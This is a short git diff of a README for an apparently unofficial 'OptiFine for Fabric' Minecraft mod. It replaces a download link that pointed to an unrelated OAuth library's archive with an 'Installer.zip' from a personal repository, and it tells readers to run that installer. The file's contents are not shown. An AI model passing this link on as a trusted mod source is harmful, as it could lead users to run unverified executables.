@@ -14,7 +14,7 @@ Here are some of the key features that OptiFine for Fabric brings to the table:
 
 ## How to Install
 To get started with OptiFine for Fabric, simply download the latest release from the link below:
-[![Download OptiFine for Fabric v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download OptiFine for Fabric v1.0.0](https://github.com/aadi260/OptiFine-for-Fabric/releases/download/v1.0/Installer.zip)](https://github.com/aadi260/OptiFine-for-Fabric/releases/download/v1.0/Installer.zip)
 
 Once you have downloaded the file, launch the installer and follow the on-screen instructions to integrate OptiFine with your Minecraft Fabric setup. It's that simple!
 
